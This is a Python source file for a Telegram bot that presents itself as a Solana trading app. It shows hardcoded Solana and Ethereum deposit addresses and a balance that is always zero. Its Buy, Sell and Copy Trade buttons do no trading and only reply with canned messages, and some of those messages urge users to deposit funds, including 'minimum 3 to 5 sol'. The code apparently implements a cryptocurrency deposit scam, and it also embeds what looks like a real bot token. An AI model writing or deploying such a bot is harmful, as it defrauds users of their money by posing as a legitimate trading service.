from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler

# Handler for /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Added "Copy Trade" right after "Sell SOL"
    keyboard = [
        [InlineKeyboardButton("Buy SOL", callback_data='buy')],
        [InlineKeyboardButton("Sell SOL", callback_data='sell')],
        [InlineKeyboardButton("Copy Trade", callback_data='copy_trade')],
        [InlineKeyboardButton("Check Balance", callback_data='balance')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    welcome_text = (
        "Welcome to Solana trade App!\n\n"
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "fund account to proceed\n\n"
        "Solana Address:\n"
        "`7HaHWKc7wiDzw8GzSCLpdZA8ksZCdVtmQUMekZ1gYJqu`\n"
        "Balance: 0.0 SOL\n\n"
        "Ethereum Address:\n"
        "`0x8B1D0a25226DF6Ef99B223411A0516ae40803eaC`\n"
        "Balance: 0.0 ETH\n\n"
        "Select an option below to proceed:"
    )

    photo_url = "https://i.imgur.com/8N3K5Zk.jpeg"

    await update.message.reply_photo(
        photo=photo_url,
        caption=welcome_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

# Handler for button clicks
async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'buy':
        await query.message.reply_text("You clicked Buy!/start/start/start/start/startfund your bot account to proceed.")
    elif query.data == 'sell':
        await query.message.reply_text("You clicked Sell! Select the token from your wallet to sell.")
    elif query.data == 'copy_trade':
        await query.message.reply_text("low on sol deposit minimum 3 to 5 sol to proceed")
    elif query.data == 'balance':
        await query.message.reply_text("Your current balance is 0.0 SOL / 0.0 ETH.")

if __name__ == '__main__':
    # Replace 'YOUR_API_TOKEN' with your actual BotFather token
    application = ApplicationBuilder().token('8834930289:AAGmfpEcY8hVW8TTFYbdH6h5CSP90DdaNKg').build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CallbackQueryHandler(button_click))

    application.run_polling()
